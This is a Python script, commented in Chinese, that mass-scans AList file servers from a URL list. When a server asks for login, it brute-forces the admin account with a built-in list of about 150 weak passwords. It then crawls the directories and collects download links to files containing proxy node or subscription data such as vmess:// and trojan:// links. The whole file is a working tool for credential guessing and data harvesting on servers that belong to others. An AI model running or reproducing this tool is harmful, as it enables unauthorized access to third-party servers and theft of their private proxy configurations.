import requests
import os
import concurrent.futures
from collections import deque
from datetime import datetime
import pytz
import csv
import urllib3
import re

# 禁用安全警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ======================== 核心参数配置 ========================
INPUT_FILE = 'deduplicated.txt'     # 输入网址清单
OUTPUT_DIR = 'scan_results'      # 结果输出目录
STATUS_FILE = 'site_status.csv'   # 站点存活状态表
MAX_THREADS = 60                 # 线程数
TIMEOUT = 5                      # 超时设置
MAX_DEPTH = 4                    # 扫描深度

# 资源白名单 (仅保留与订阅、节点、代理配置相关的后缀)
INCLUDE_EXTS = {
    'yaml', 'yml', 'conf', 'config', 'clash', 'json', 'txt'
}
IGNORE_PATTERNS = {'00', '01', '02', 'bak', 'log', 'temp', 'cache'}

# 节点/订阅内容识别特征 (正则匹配)
SUB_KEYWORDS = re.compile(
    r'(proxies:|node:|proxy-groups:|vmess://|vless://|ssr://|ss://|trojan://|hysteria2://|tuic://|subscription)', 
    re.IGNORECASE
)

# ======================== AList 弱口令字典 ========================
WEAK_PASSWORDS = [
    {"username": "admin", "password": "alist"},
    {"username": "admin", "password": "admin"},
    {"username": "admin", "password": "123456"},
    {"username": "admin", "password": "123456."},
    {"username": "admin", "password": "a123456"},
    {"username": "admin", "password": "a123456."},
    {"username": "admin", "password": "123456a"},
    {"username": "admin", "password": "123456a."},
    {"username": "admin", "password": "123456abc"},
    {"username": "admin", "password": "123456abc."},
    {"username": "admin", "password": "abc123456"},
    {"username": "admin", "password": "abc123456."},
    {"username": "admin", "password": "woaini1314"},
    {"username": "admin", "password": "woaini1314."},
    {"username": "admin", "password": "qq123456"},
    {"username": "admin", "password": "qq123456."},
    {"username": "admin", "password": "woaini520"},
    {"username": "admin", "password": "woaini520."},
    {"username": "admin", "password": "woaini123"},
    {"username": "admin", "password": "woaini123."},
    {"username": "admin", "password": "woaini521"},
    {"username": "admin", "password": "woaini521."},
    {"username": "admin", "password": "qazwsx"},
    {"username": "admin", "password": "qazwsx."},
    {"username": "admin", "password": "1qaz2wsx"},
    {"username": "admin", "password": "1qaz2wsx."},
    {"username": "admin", "password": "1q2w3e4r"},
    {"username": "admin", "password": "1q2w3e4r."},
    {"username": "admin", "password": "1q2w3e4r5t"},
    {"username": "admin", "password": "1q2w3e4r5t."},
    {"username": "admin", "password": "1q2w3e"},
    {"username": "admin", "password": "1q2w3e."},
    {"username": "admin", "password": "qwertyuiop"},
    {"username": "admin", "password": "qwertyuiop."},
    {"username": "admin", "password": "zxcvbnm"},
    {"username": "admin", "password": "zxcvbnm."},
    {"username": "admin", "password": "5201314"},
    {"username": "admin", "password": "111111"},
    {"username": "admin", "password": "123123"},
    {"username": "admin", "password": "000000"},
    {"username": "admin", "password": "qwe123"},
    {"username": "admin", "password": "7758521"},
    {"username": "admin", "password": "123qwe"},
    {"username": "admin", "password": "a123123"},
    {"username": "admin", "password": "123456aa"},
    {"username": "admin", "password": "woaini"},
    {"username": "admin", "password": "100200"},
    {"username": "admin", "password": "1314520"},
    {"username": "admin", "password": "123321"},
    {"username": "admin", "password": "q123456"},
    {"username": "admin", "password": "123456789"},
    {"username": "admin", "password": "123456789a"},
    {"username": "admin", "password": "5211314"},
    {"username": "admin", "password": "asd123"},
    {"username": "admin", "password": "a123456789"},
    {"username": "admin", "password": "z123456"},
    {"username": "admin", "password": "asd123456"},
    {"username": "admin", "password": "a5201314"},
    {"username": "admin", "password": "aa123456"},
    {"username": "admin", "password": "zhang123"},
    {"username": "admin", "password": "aptx4869"},
    {"username": "admin", "password": "123123a"},
    {"username": "admin", "password": "1qazxsw2"},
    {"username": "admin", "password": "5201314a"},
    {"username": "admin", "password": "aini1314"},
    {"username": "admin", "password": "31415926"},
    {"username": "admin", "password": "q1w2e3r4"},
    {"username": "admin", "password": "123456qq"},
    {"username": "admin", "password": "1234qwer"},
    {"username": "admin", "password": "a111111"},
    {"username": "admin", "password": "520520"},
    {"username": "admin", "password": "iloveyou"},
    {"username": "admin", "password": "abc123"},
    {"username": "admin", "password": "110110"},
    {"username": "admin", "password": "111111a"},
    {"username": "admin", "password": "w123456"},
    {"username": "admin", "password": "7758258"},
    {"username": "admin", "password": "123qweasd"},
    {"username": "admin", "password": "159753"},
    {"username": "admin", "password": "qwer1234"},
    {"username": "admin", "password": "a000000"},
    {"username": "admin", "password": "qq123123"},
    {"username": "admin", "password": "zxc123"},
    {"username": "admin", "password": "123654"},
    {"username": "admin", "password": "123456q"},
    {"username": "admin", "password": "qq5201314"},
    {"username": "admin", "password": "12345678"},
    {"username": "admin", "password": "000000a"},
    {"username": "admin", "password": "456852"},
    {"username": "admin", "password": "as123456"},
    {"username": "admin", "password": "1314521"},
    {"username": "admin", "password": "112233"},
    {"username": "admin", "password": "521521"},
    {"username": "admin", "password": "qazwsx123"},
    {"username": "admin", "password": "zxc123456"},
    {"username": "admin", "password": "abcd1234"},
    {"username": "admin", "password": "asdasd"},
    {"username": "admin", "password": "666666"},
    {"username": "admin", "password": "love1314"},
    {"username": "admin", "password": "QAZ123"},
    {"username": "admin", "password": "aaa123"},
    {"username": "admin", "password": "q1w2e3"},
    {"username": "admin", "password": "aaaaaa"},
    {"username": "admin", "password": "a123321"},
    {"username": "admin", "password": "123000"},
    {"username": "admin", "password": "11111111"},
    {"username": "admin", "password": "12qwaszx"},
    {"username": "admin", "password": "5845201314"},
    {"username": "admin", "password": "s123456"},
    {"username": "admin", "password": "nihao123"},
    {"username": "admin", "password": "caonima123"},
    {"username": "admin", "password": "zxcvbnm123"},
    {"username": "admin", "password": "wang123"},
    {"username": "admin", "password": "159357"},
    {"username": "admin", "password": "1A2B3C4D"},
    {"username": "admin", "password": "asdasd123"},
    {"username": "admin", "password": "584520"},
    {"username": "admin", "password": "753951"},
    {"username": "admin", "password": "147258"},
    {"username": "admin", "password": "1123581321"},
    {"username": "admin", "password": "110120"},
    {"username": "admin", "password": "qq1314520"},
    {"username": "admin", "password": "password"},
    {"username": "admin", "password": "admin123"},
    {"username": "admin", "password": "admin888"},
    {"username": "admin", "password": "root"},
    {"username": "admin", "password": "guest"},
    {"username": "admin", "password": "asdfghjkl"},
    {"username": "admin", "password": "qwerty"},
    {"username": "admin", "password": "88888888"},
    {"username": "admin", "password": "66666666"},
    {"username": "admin", "password": "999999"},
    {"username": "admin", "password": "12341234"},
    {"username": "admin", "password": "123123123"},
    {"username": "admin", "password": "20202020"},
    {"username": "admin", "password": "20212021"},
    {"username": "admin", "password": "20222022"},
    {"username": "admin", "password": "20232023"},
    {"username": "admin", "password": "20242024"},
    {"username": "admin", "password": "20252025"},
    {"username": "admin", "password": "20262026"},
    {"username": "admin", "password": "admin@123"},
    {"username": "admin", "password": "admin123456"},
    {"username": "admin", "password": "1234567890"},
    {"username": "admin", "password": "mima123456"},
    {"username": "admin", "password": "shoujihao"}
]

# ======================== 功能函数 ========================

def load_status_cache():
    """加载历史扫描状态，用于跳过已知死链"""
    cache = {}
    if os.path.exists(STATUS_FILE):
        with open(STATUS_FILE, 'r', encoding='utf-8') as f:
            reader = csv.DictReader(f)
            for row in reader:
                cache[row['url']] = row['status']
    return cache

def attempt_login(base_url, session):
    """仅在必要时(401)触发弱口令尝试"""
    login_url = f"{base_url.rstrip('/')}/api/auth/login"
    for cred in WEAK_PASSWORDS:
        try:
            resp = session.post(login_url, json=cred, timeout=3, verify=False)
            if resp.status_code == 200 and resp.json().get("code") == 200:
                return resp.json().get("data", {}).get("token")
        except: continue
    return None

def fetch_list(base_url, path, token, session):
    """底层 API 请求：处理目录列表获取"""
    api_url = f"{base_url.rstrip('/')}/api/fs/list"
    headers = {"Authorization": token} if token else {}
    payload = {"path": path, "password": "", "page": 1, "per_page": 0}
    
    try:
        r = session.post(api_url, json=payload, headers=headers, timeout=TIMEOUT, verify=False)
        res = r.json()
        if res.get("code") == 200:
            return res.get("data", {}).get("content", []), token
        if res.get("code") == 401 and not token:
            new_token = attempt_login(base_url, session)
            if new_token:
                return fetch_list(base_url, path, new_token, session)
    except: pass
    return None, token

def inspect_content(d_url, session):
    """远程读取文档内容并检测节点特征"""
    try:
        # 仅读取前 2KB 字节以节省带宽并判断
        headers = {"Range": "bytes=0-2048"}
        r = session.get(d_url, timeout=TIMEOUT, verify=False, headers=headers)
        if r.status_code in [200, 206]:
            if SUB_KEYWORDS.search(r.text):
                return True
    except: pass
    return False

def scan_site(url, session):
    """单站点递归扫描逻辑"""
    print(f"[*] 扫描中: {url}")
    found_files = []
    queue = deque([("/", 0)]) # (路径, 当前深度)
    visited = {"/"}
    token = None
    is_alive = False

    while queue:
        path, depth = queue.popleft()
        if depth > MAX_DEPTH: continue

        items, token = fetch_list(url, path, token, session)
        if items is None: continue 
        
        is_alive = True 
        for item in items:
            name = item.get('name', '')
            if any(x in name for x in [".git", ".github"]): continue
            
            full_path = f"{path.rstrip('/')}/{name}"
            if item.get('is_dir'):
                if full_path not in visited:
                    visited.add(full_path)
                    queue.append((full_path, depth + 1))
            else:
                ext = name.split('.')[-1].lower() if '.' in name else ''
                if ext in INCLUDE_EXTS:
                    if any(p in name.lower() for p in IGNORE_PATTERNS): continue
                    
                    # 修正此处的字符串闭合语法错误
                    d_url = f"{url.rstrip('/')}/d{full_path}"
                    
                    # 检查内容是否符合节点/订阅特征
                    if inspect_content(d_url, session):
                        found_files.append((ext, name, d_url))
    
    status = "Success" if is_alive else "Failed/Timeout"
    return url, found_files, status

# ======================== 主程序 ========================

def main():
    cache = load_status_cache()
    if not os.path.exists(OUTPUT_DIR): os.makedirs(OUTPUT_DIR)
    
    with open(INPUT_FILE, 'r', encoding='utf-8') as f:
        raw_urls = list(set(line.strip() for line in f if line.strip().startswith('http')))
    urls = [u for u in raw_urls if cache.get(u) != "Failed/Timeout"]

    print(f"📊 任务: 待扫描 {len(urls)} (已跳过死链 {len(raw_urls)-len(urls)})")

    session = requests.Session()
    adapter = requests.adapters.HTTPAdapter(pool_connections=MAX_THREADS, pool_maxsize=MAX_THREADS*2)
    session.mount('http://', adapter)
    session.mount('https://', adapter)

    all_results = []
    status_report = []

    with concurrent.futures.ThreadPoolExecutor(MAX_THREADS) as executor:
        future_to_url = {executor.submit(scan_site, u, session): u for u in urls}
        for future in concurrent.futures.as_completed(future_to_url):
            url, res, status = future.result()
            status_report.append({'url': url, 'file_count': len(res), 'status': status})
            all_results.extend(res)

    scanned_urls = {d['url'] for d in status_report}
    for u in raw_urls:
        if u not in scanned_urls:
            status_report.append({'url': u, 'file_count': 0, 'status': cache.get(u, 'Skipped')})
    
    with open(STATUS_FILE, 'w', encoding='utf-8', newline='') as f:
        writer = csv.DictWriter(f, fieldnames=['url', 'file_count', 'status'])
        writer.writeheader()
        writer.writerows(status_report)

    ext_map = {}
    for ext, name, d_url in set(all_results): 
        ext_map.setdefault(ext, []).append(f"{name},{d_url}")

    now = datetime.now(pytz.timezone('Asia/Shanghai')).strftime("%Y-%m-%d %H:%M")
    for ext, lines in ext_map.items():
        with open(os.path.join(OUTPUT_DIR, f"{ext}.txt"), 'w', encoding='utf-8') as f:
            f.write(f"# 节点资源发现: {now}\n\n" + "\n".join(sorted(lines)))

    print(f"✅ 完成！结果已分类存入 {OUTPUT_DIR}")

if __name__ == "__main__":
    main()
